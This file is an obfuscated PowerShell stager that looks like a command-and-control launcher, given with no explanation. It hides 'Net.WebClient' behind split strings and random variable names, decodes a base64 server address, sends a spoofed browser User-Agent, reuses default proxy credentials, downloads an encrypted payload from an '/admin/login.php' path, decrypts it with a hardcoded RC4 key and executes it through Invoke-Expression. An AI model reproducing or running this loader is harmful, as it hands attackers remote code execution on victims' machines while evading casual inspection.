$ILsJAXkCjRcsNcfYeLDpwJZdGOMRoeXWHJbLRHHBGRaskrEQjWOyDgOZXcoqjPShNcistxNaSiYUmHtcXpqGTLjlsmGrSKqbJhHILOvwcOsBYrasppqRNUJOWUsIBfKnOOWspIOUlsZrmzoZCQLKujFfRTfPOtQpaFFrGcvkjOgeCQeOByBzGVnQEVREJdMotntvGsmcJfeUTpAmgzzxcplUjIrJqpGyiyeegqMkcLbtTCqcfqorgjOPOrRKVKHSjdJmuWNAOpIwvOLLQWrPOARuCAJZwr = "`l`ient"
$KAyGjZLBHkKjWxiOxogzHATQmoNIndPeMTCVaPJWSIplvusbwKxDEPUPtWTQRisXMUrWbikbCIPHHmMVAfjiRfDkoLXCaxkNqaHeVdPAklUMgMESdQTtcYzekyNffAopvcqjPdEkaqkxxbLodkEkQqawEhTNnsylJKfAHfYPvUnnundaXXEBJikUIEdpbUSoaTwMQgKzcjaqNfQqjkAMyvJazVFrufTIljrPCpSrNYCKfUZCOetxdpvIRPefKxmafgAOZjRQBVDomLEohMUviOSvHjsENmVQYZROKvvZbgHehsNEaCVsPREbJbjlrFcsdMiT = "`Net`.`WebC"
$wc=New-Object System.$KAyGjZLBHkKjWxiOxogzHATQmoNIndPeMTCVaPJWSIplvusbwKxDEPUPtWTQRisXMUrWbikbCIPHHmMVAfjiRfDkoLXCaxkNqaHeVdPAklUMgMESdQTtcYzekyNffAopvcqjPdEkaqkxxbLodkEkQqawEhTNnsylJKfAHfYPvUnnundaXXEBJikUIEdpbUSoaTwMQgKzcjaqNfQqjkAMyvJazVFrufTIljrPCpSrNYCKfUZCOetxdpvIRPefKxmafgAOZjRQBVDomLEohMUviOSvHjsENmVQYZROKvvZbgHehsNEaCVsPREbJbjlrFcsdMiT$ILsJAXkCjRcsNcfYeLDpwJZdGOMRoeXWHJbLRHHBGRaskrEQjWOyDgOZXcoqjPShNcistxNaSiYUmHtcXpqGTLjlsmGrSKqbJhHILOvwcOsBYrasppqRNUJOWUsIBfKnOOWspIOUlsZrmzoZCQLKujFfRTfPOtQpaFFrGcvkjOgeCQeOByBzGVnQEVREJdMotntvGsmcJfeUTpAmgzzxcplUjIrJqpGyiyeegqMkcLbtTCqcfqorgjOPOrRKVKHSjdJmuWNAOpIwvOLLQWrPOARuCAJZwr;
$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';
$ser=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwAxADAALgAwAC4AMgAuADQAOgA4ADAAMAAwAA==')));
$t='/admin/login.php';
$wc.Headers.Add('User-Agent',$u);
$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;
$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;
$Script:Proxy = $wc.Proxy;$K=[System.Text.Encoding]::ASCII.GetBytes('q5DRvd&HF}~MGS.)#TroflKCiW/c8?>z');
$R={
    $D,$K=$Args;
    $S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.Count])%256;
    $S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;
    $H=($H+$S[$I])%256;
    $S[$I],$S[$H]=$S[$H],$S[$I];
    $_-bxor$S[($S[$I]+$S[$H])%256]}
    };
$wc.Headers.Add("Cookie","PHPID=dWMTco5nP2ZKsRKl0z6YSADWpjk=");
$data=$wc.DownloadData($ser+$t);
$iv=$data[0..3];
$data=$data[4..$data.length];
-join[Char[]](& $R $data ($IV+$K))|IEX
